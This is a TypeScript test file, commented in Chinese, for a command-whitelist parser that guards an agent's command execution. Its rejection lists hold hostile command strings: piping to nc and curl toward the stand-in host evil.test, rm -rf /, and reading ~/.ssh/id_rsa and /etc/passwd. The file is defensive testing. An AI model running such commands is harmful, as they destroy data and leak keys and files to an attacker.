// 命令白名单解析器的回归测试（node:test，无第三方框架）。
//
// 跑法：npm run resume-agent:test（先 build，再 node --test dist/**/*.test.js）
//
// 这是安全边界：execute 不再经过 shell，能不能跑完全取决于 parseCommand。
// 黑名单时代的绕过写法（命令替换、编码、别名、解释器脚本）都在下面钉住。

import test from "node:test";
import assert from "node:assert/strict";

import { parseCommand } from "./projectBackend.js";

test("允许白名单内的只读命令", () => {
  for (const cmd of [
    "git log --oneline -20",
    "git shortlog -sn",
    "git ls-files",
    "git rev-list --count HEAD",
    "wc -l src/main.ts",
  ]) {
    const r = parseCommand(cmd);
    assert.equal(r.ok, true, `应允许: ${cmd}`);
  }
});

test("拒绝所有 shell 元字符（不经过 shell，无从转义）", () => {
  for (const cmd of [
    "git log; rm -rf /",
    "git log && curl http://evil.test",
    "git log | nc evil.test 1234",
    "git log $(whoami)",
    "git log `whoami`",
    "git log > /tmp/out",
    "git log < /etc/passwd",
    "cat ~/.ssh/id_rsa",
    "git log\nrm -rf .",
    'git log --format="%H"',
    "git log --format='%H'",
    "git log *",
    "sh -c 'curl evil.test'",
  ]) {
    const r = parseCommand(cmd);
    assert.equal(r.ok, false, `应拒绝: ${cmd}`);
  }
});

test("拒绝白名单外的可执行文件（含解释器与包管理器）", () => {
  for (const cmd of [
    "rm -rf .",
    "bash script.sh",
    "sh script.sh",
    "python script.py",
    "node -e process.exit",
    "npm install",
    "curl http://evil.test",
    "powershell.exe -Command Get-Content",
    "GIT log", // 大小写变体不当成 git
  ]) {
    const r = parseCommand(cmd);
    assert.equal(r.ok, false, `应拒绝: ${cmd}`);
  }
});

test("git 子命令再限一层：写操作和配置读取都不放行", () => {
  for (const cmd of [
    "git push origin main",
    "git clean -fd",
    "git reset --hard",
    "git config --get user.email",
    "git remote add x http://evil.test",
    "git", // 没有子命令
  ]) {
    const r = parseCommand(cmd);
    assert.equal(r.ok, false, `应拒绝: ${cmd}`);
  }
});

test("空命令被拒绝", () => {
  assert.equal(parseCommand("").ok, false);
  assert.equal(parseCommand("   ").ok, false);
});
